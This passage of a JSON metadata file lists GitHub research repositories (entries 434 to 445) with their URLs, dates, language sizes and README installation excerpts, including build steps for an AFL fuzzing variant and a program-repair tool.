                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 8518
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "434": {
        "filename": "mbafrani_AutomaticProcessSimulation_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/mbafrani/AutomaticProcessSimulation",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2020-06-23T09:06:35Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-04T17:52:29Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 17176
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "435": {
        "filename": "DIVERSIFY-project_sosiefier_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/DIVERSIFY-project/sosiefier",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2014-01-27T16:00:46Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2020-10-18T05:45:37Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 37173315
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 304868
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 144147
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "R",
                    "name": "R",
                    "type": "Programming_language",
                    "size": 60506
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Smalltalk",
                    "name": "Smalltalk",
                    "type": "Programming_language",
                    "size": 15020
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 12104
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 2317
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "436": {
        "filename": "ChunghaSung_EC-Diff_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ChunghaSung/EC-Diff",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "  1. Under ``src``, type ``mkdir build``.\n  2. ``cd build``\n  3. cmake ../ && make\n \n",
                    "original_header": "To build (tested with LLVM 3.8.0) our program."
                },
                "confidence": 0.999992430270099,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ChunghaSung/EC-Diff/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-07-10T18:11:21Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-11-20T10:05:42Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 317139
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 68584
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "SMT",
                    "name": "SMT",
                    "type": "Programming_language",
                    "size": 32710
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 21521
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CMake",
                    "name": "CMake",
                    "type": "Programming_language",
                    "size": 1005
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "437": {
        "filename": "SophieHYe_SelfAPR_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ASSERT-KTH/SelfAPR",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "```\npython3 3_prepare_test_data.py\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Prepare a set of evaluation bugs from Defects4J:",
                    "parent_header": [
                        "SelfAPR: Self-supervised Program Repair with Test Execution Diagnostics",
                        "Code perturbation scripts"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/SophieHYe/SelfAPR/main/README.md"
            },
            {
                "result": {
                    "value": "```\npip install transformers\npip install sentencepiece\npython3 4_train.py\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "We are ready to train the perturbed samples with transformer:Pytorch==1.7.1 and transformers&gt;=4.10.0",
                    "parent_header": [
                        "SelfAPR: Self-supervised Program Repair with Test Execution Diagnostics",
                        "Code perturbation scripts"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/SophieHYe/SelfAPR/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "|\tPerturb Actions\t| Explanation |\n|\t---\t|---\t|\n|\tP1 Replace type\t|modify declaring type ... |\n|\tP2 Replace operator\t| modify operator ==, !=, etc|\n|\tP3 replace literal\t| modify literal, \"STRING\", true, false |\n|\tP4 replace constructor\t| modify constructor |\n|\tP5 replace variable\t| modify arguments/swap argumens |\n|\tP6 replace condition expression\t| reduce/expand boolean expression|\n|\tP7 replace invocation\t| modify invocation |\n|\tP8 compound statement\t| compound of rules|\n|\tP9 replace with similarity\t| replace by transplanting a similar donor statement|\n|\tP10 move statement\t| move a later statement before the target statement |\n|\tP11 transplatant statement\t| transplanting a donor statement |\n|\tP12 transplatant condition\t|  wrap target statement with an existing conditional block|\n|\tP13 transplatant a block\t| insert an existing block (if, loop, etc)|\n|\tP14 remove a statement\t| delete statement |\n|\tP15 unwrap a statement\t| unwrap block |\n|\tP16 remove a block\t| remove block | \n",
                    "original_header": "All perturbed rules generated by SelfAPR"
                },
                "confidence": 0.9999902398969833,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/SophieHYe/SelfAPR/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-12-24T05:19:05Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-03-08T04:49:08Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 2193023055
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 68452
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "438": {
        "filename": "testingautomated-usi_uncertainty-wizard_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/testingautomated-usi/uncertainty-wizard",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "It's as easy as `pip install uncertainty-wizard`\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/testingautomated-usi/uncertainty-wizard/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-12-13T04:33:38Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-08T06:32:42Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 205167
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 8575
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "439": {
        "filename": "mdrafiqulrabin_CI-DD-Perses_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/mdrafiqulrabin/CI-DD-Perses",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Artifact for Article (CI-DD-Perses):\n- ACM DL: https://dl.acm.org/do/10.5281/zenodo.6630188\n- Zenodo: https://doi.org/10.5281/zenodo.6630188 \nReproducible Capsule of FeatureExtractor:\n- CodeOcean: https://codeocean.com/capsule/7985340/tree/v1 \n",
                    "original_header": "CI-DD-Perses"
                },
                "confidence": 0.9595544548846651,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/mdrafiqulrabin/CI-DD-Perses/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-05-04T07:16:54Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-05T00:39:57Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 38397
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1199
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 145
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "440": {
        "filename": "ICPC2022-Gypsum_GypSum_Code_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ICPC2022-Gypsum/GypSum_Code",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```bash\nGypsum-main\n\u251c\u2500- README.md\n\u251c\u2500\u2500 c2nl\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 __init__.py\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 __pycache__\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 config.py\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 decoders\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 encoders\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 eval\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 inputters\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 models\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 modules\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 objects\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 tokenizers\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 translator\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 utils\n\u251c\u2500\u2500 config\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 general_config.yml\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 java_xxx_xxx.yml\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 ...\n\u251c\u2500\u2500 data\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 java\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 python\n\u251c\u2500\u2500 evaluation\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 bleu\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 evaluate.py\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 meteor\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 rouge\n\u251c\u2500\u2500 gypsum\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 __pycache__\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 data\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 metor.ipynb\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 model.py\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 modules\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 predict.py\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 train.py\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 utils\n\u251c\u2500\u2500 modules\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 __pycache__\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 attention_zoo.py\n\u251c\u2500\u2500 preprocess\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 generate_java_graph.ipynb\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 java_graph_construct.py\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 python_ast.ipynb\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 python_graph.py\n\u2514\u2500\u2500 run\n``` \n",
                    "original_header": "Structure"
                },
                "confidence": 0.9987916781197134,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ICPC2022-Gypsum/GypSum_Code/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-01-19T12:26:30Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-02T09:31:47Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 415154
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 369313
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 107
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "441": {
        "filename": "UPHF_eapr_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/UPCArtifacts/eapr",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2020-11-13T10:47:05Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2020-11-16T07:16:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "442": {
        "filename": "NobleMathews_mocktail-blue-lagoon_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/NobleMathews/mocktail-blue-lagoon",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-11-06T22:47:23Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-03-25T07:01:31Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 175828
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 3710
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1646
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "443": {
        "filename": "OpsPAI_grlia_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/OpsPAI/grlia",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-08-10T01:32:21Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2021-12-29T07:49:04Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "444": {
        "filename": "wang-jingyi_Ziqian_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/wang-jingyi/Ziqian",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "* This is a maven project based on jdk1.7 or later.\n* You have to install maven to run this project, which can be downloaded [here](http://maven.apache.org/).\n* After cloning the project, import the project as a maven project to Eclipse.\n",
                    "type": "Text_excerpt",
                    "original_header": "How do I set up?",
                    "parent_header": [
                        "README",
                        "Ziqian implements:"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/wang-jingyi/Ziqian/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "* This project is maintained by ***WANG Jingyi (\u738b\u7adf\u4ea6)***, contact ***wangjyee@gmail.com*** if you encounter any issues or have suggestions to improve.\n \n",
                    "original_header": "Who do I talk to?"
                },
                "confidence": 0.9815936965229123,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/wang-jingyi/Ziqian/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2017-06-30T04:39:13Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-02-05T02:32:47Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 8443224
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 6921656
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 5222019
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 1297469
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Perl 6",
                    "name": "Perl 6",
                    "type": "Programming_language",
                    "size": 148928
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 88026
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 28804
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Pascal",
                    "name": "Pascal",
                    "type": "Programming_language",
                    "size": 27564
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 24900
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Batchfile",
                    "name": "Batchfile",
                    "type": "Programming_language",
                    "size": 24404
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Yacc",
                    "name": "Yacc",
                    "type": "Programming_language",
                    "size": 21537
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 19905
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Lex",
                    "name": "Lex",
                    "type": "Programming_language",
                    "size": 6908
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "NSIS",
                    "name": "NSIS",
                    "type": "Programming_language",
                    "size": 5653
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Vim Script",
                    "name": "Vim Script",
                    "type": "Programming_language",
                    "size": 2745
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "M4",
                    "name": "M4",
                    "type": "Programming_language",
                    "size": 1079
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TeX",
                    "name": "TeX",
                    "type": "Programming_language",
                    "size": 169
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "445": {
        "filename": "FoRTE-Research_afl-fid_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/FoRTE-Research/afl-fid",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "This repository contains several modified versions of [AFL](http://lcamtuf.coredump.cx/afl) components which we utilize in our experiments on fixed (pre-generated) fuzzing input datasets: \n* **afl-saveinputs** - dumps AFL-generated inputs and their sizes to file (for fixed input dataset experiments).\n* **afl-testtrace** - evaluates any tracer's (e.g., QEMU, Dyninst) execution time on a fixed input dataset.\n* **afl-cc forkserver-only extension** - inserts *only* a forkserver during AFL's assembly-time instrumentation (useful for benchmarking).\n\n<table>\n  <tr>\n    <td align=center colspan=\"2\"><div><b>Presented in our paper</b> <a href=\"https://arxiv.org/abs/1812.11875\"><i>Full-speed Fuzzing: Reducing Fuzzing Overhead through Coverage-guided Tracing</i></a><br>(to appear in the 2019 IEEE Symposium on Security and Privacy).</td>\n  </tr>\n  <tr>\n    <td><b>Citing this repository:</b></td>\n    <td>\n      <code class=\"rich-diff-level-one\">@inproceedings{nagy:fullspeedfuzzing,</code><br>\n      <code class=\"rich-diff-level-one\">title = {Full-speed Fuzzing: Reducing Fuzzing Overhead through Coverage-guided Tracing},</code><br>\n      <code class=\"rich-diff-level-one\">author = {Stefan Nagy and Matthew Hicks},</code><br>\n      <code class=\"rich-diff-level-one\">booktitle = {{IEEE} Symposium on Security and Privacy (Oakland)},</code><br>\n      <code class=\"rich-diff-level-one\">year = {2019},}</code>\n    </td>\n  </tr>\n  <tr>\n    <td><b>Developer:</b></td>\n    <td>Stefan Nagy (<a href=\"mailto:snagy2@vt.edu\">snagy2@vt.edu</a>) and Matthew Hicks (<a href=\"mailto:mdhicks2@vt.edu\">mdhicks2@vt.edu</a>) </td>\n  </tr>\n  <tr>\n    <td><b>License:</b></td>\n    <td><a href=\"/FoRTE-Research/UnTracer-AFL/blob/master/LICENSE\">MIT License</a></td>\n  </tr>\n  <tr>\n    <td><b>Disclaimer:</b></td>\n    <td><i>This software is strictly a research prototype.</i></td>\n  </tr>\n</table>\n",
                    "type": "Text_excerpt",
                    "original_header": "FoRTE-Research's AFL for Fixed Input Datasets"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/FoRTE-Research/afl-fid/master/readme.md"
            },
            {
                "result": {
                    "value": "```\nsudo apt-get install libtool-bin libglib2.0-dev automake flex bison\ncd afl-fid/qemu_mode_v1\nsudo ./build_qemu_support.sh\nchmod +x ../afl-qemu-trace\n```\nNote the following: \n* The build may finish with an error even though `afl-qemu-trace` was built correctly. We recommend checking a few build status messages in the log to determine if the build was successful.\n* For running with the optimized QEMU with block chaining enabled, build instead from `qemu_mode_v2`. When running `afl-saveinputs` or `afl-testtrace`, replace `-Q` with `-QQ`.\n",
                    "type": "Text_excerpt",
                    "original_header": "2. (optional) Build AFL's QEMU-mode tracing:",
                    "parent_header": [
                        "FoRTE-Research's AFL for Fixed Input Datasets",
                        "INSTALLATION"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/FoRTE-Research/afl-fid/master/readme.md"
            },
            {
                "result": {
                    "value": "`afl-saveinputs` is a modified version of `afl-fuzz` for dumping generated inputs to file. Usage is as follows:\n```\nafl-saveinputs -i [/path/to/seed_dir] -o [/path/to/out_dir] -e [time budget (# minutes)] [optional_args] -Q -- [/path/to/target] [target_args]\n```\nInput dump and sizes will be stored in `out_dir/_INPUT_DUMP` and `out_dir/_INPUT_SIZES`, respectively.  \n * **Note:** QEMU mode is recommended, otherwise dumps may be explosively large in size (depending on fuzzing speed).\n",
                    "type": "Text_excerpt",
                    "original_header": "afl-saveinputs",
                    "parent_header": [
                        "FoRTE-Research's AFL for Fixed Input Datasets"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/FoRTE-Research/afl-fid/master/readme.md"
            },
            {
                "result": {
                    "value": "`afl-testtrace` is an `afl-fuzz` modification for logging each fuzzed input's tracing time. Given an input dump and corresponding sizes file (produced by `afl-saveinputs`), It recreates each input and logs its execution (function `run_target()` in `afl-fuzz`) time. Usage is as follows:\n```\nafl-testrace -i [/path/to/input/data/dump] -s [/path/to/input/sizes/dump] -o [/path/to/outdir] -f [/path/to/outfile] -c [max execs | skip for full dump] -t [exec timeout | skip for default (100ms)] -- [/path/to/target] [target_args]\n```\n * **Note:** only non-position-independent target binaries are supported. Be sure to compile all target binaries with the `-no-pie` compiler flag (unnecessary for Clang).\n ",
                    "type": "Text_excerpt",
                    "original_header": "afl-testtrace",
                    "parent_header": [
                        "FoRTE-Research's AFL for Fixed Input Datasets"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/FoRTE-Research/afl-fid/master/readme.md"
            },
            {
                "result": {
                    "value": "We extend the `afl-cc` assembly-time instrumentation with a forkserver-only instrumentation mode for use in benchmarking experiments. To invoke this mode, simply append `-Wa,-F` to your `afl-cc` (e.g., `afl-gcc`, `afl-clang`) compiler flags and compile as usual. Example:",
                    "type": "Text_excerpt",
                    "original_header": "afl-cc forkserver-only extension",
                    "parent_header": [
                        "FoRTE-Research's AFL for Fixed Input Datasets"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/FoRTE-Research/afl-fid/master/readme.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "We extend the `afl-cc` assembly-time instrumentation with a forkserver-only instrumentation mode for use in benchmarking experiments. To invoke this mode, simply append `-Wa,-F` to your `afl-cc` (e.g., `afl-gcc`, `afl-clang`) compiler flags and compile as usual. Example:\n```\n./configure --disable-shared CC=afl-clang CXX=afl-clang++ CFLAGS=\"-g -O2 -no-pie -Wa,F\" CXXFLAGS=\"-g -O2 -no-pie -Wa,-F\"\nmake all\n``` \n#\n<p align=center> <a href=\"https://www.cs.vt.edu\"><img border=\"0\" src=\"http://people.cs.vt.edu/snagy2/img/vt_inline_computer_science.png\" width=\"60%\" height=\"60%\">\n</a> </p>\n \n"
                },
                "confidence": 0.9986154528421503,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/FoRTE-Research/afl-fid/master/readme.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-01-24T19:47:35Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-11-09T18:56:36Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 528834
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 23694
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 20494
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 19955
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Objective-C",
                    "name": "Objective-C",
                    "type": "Programming_language",
                    "size": 10195
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 3476
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Rich Text Format",
                    "name": "Rich Text Format",
                    "type": "Programming_language",
                    "size": 21
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 20
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
